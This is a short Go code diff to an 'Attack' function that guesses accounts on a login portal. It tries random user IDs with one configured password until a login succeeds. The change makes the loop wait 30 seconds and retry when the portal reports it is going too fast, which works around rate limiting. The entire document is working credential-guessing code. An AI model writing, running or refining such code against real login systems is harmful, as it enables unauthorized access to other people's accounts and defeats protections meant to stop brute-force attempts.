@@ -19,11 +19,13 @@ type AttackConfig struct {
 var attackLogger = log.New("auth/attack")
 
 func Attack(cfg *AttackConfig) error {
-
 	tried := make(map[string]struct{})
 
-	var userid string
 	for {
+		userid := RandomUserid()
+
+	TooFastRetry:
+
 		if cfg.Base == "" {
 			base, err := FindPortal(cfg.Host, cfg.Link)
 			if err != nil {
@@ -31,8 +33,6 @@ func Attack(cfg *AttackConfig) error {
 			}
 			cfg.Base = base
 		}
-
-		userid = RandomUserid()
 
 		if _, ok := tried[userid]; ok {
 			continue
@@ -46,8 +46,16 @@ func Attack(cfg *AttackConfig) error {
 			UserID:   userid,
 			Password: cfg.Password,
 		}); err != nil {
-			attackLogger.Warn("failed to login", "error", err)
-			continue
+			switch err {
+			case ErrTooFast:
+				attackLogger.Warn("too fast, try again later")
+				time.Sleep(30 * time.Second)
+				goto TooFastRetry
+			default:
+				attackLogger.Warn("failed to login", "error", err)
+				continue
+			}
+
 		}
 
 		break
